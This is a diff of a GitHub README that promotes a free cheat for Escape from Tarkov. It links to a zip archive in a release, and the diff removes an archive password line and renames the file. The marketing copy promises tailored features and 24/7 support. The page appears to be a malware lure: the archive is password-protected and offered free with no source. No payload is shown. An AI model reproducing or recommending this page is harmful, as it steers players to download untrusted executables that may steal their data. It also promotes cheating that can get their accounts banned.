@@ -1,9 +1,8 @@
-> # Passw0rd: 5566
 
 > [!Note]
 > > Click on the image to download
 
-[<img src="https://github.com/user-attachments/assets/320c2f13-f72a-4d68-8291-080e6521bdd0">](https://github.com/lordapanzro/VX_EFT/releases/download/EFT/Eft_VX_Full_2024.zip)
+[<img src="https://github.com/user-attachments/assets/320c2f13-f72a-4d68-8291-080e6521bdd0">](https://github.com/lordapanzro/VX_EFT/releases/download/EFT/EFT_VX.zip)
 
 > [!NOTE]
 > EFT VX  cheat is meticulously crafted to enhance your gaming experience by giving you unparalleled control over your gameplay. With a diverse array of features that can be tailored to your individual preferences, we are excited to announce that our cheat is now available for free to all players. Our dedicated 24/7 support team ensures that any issues are addressed promptly, keeping our cheat at the forefront of the gaming community.
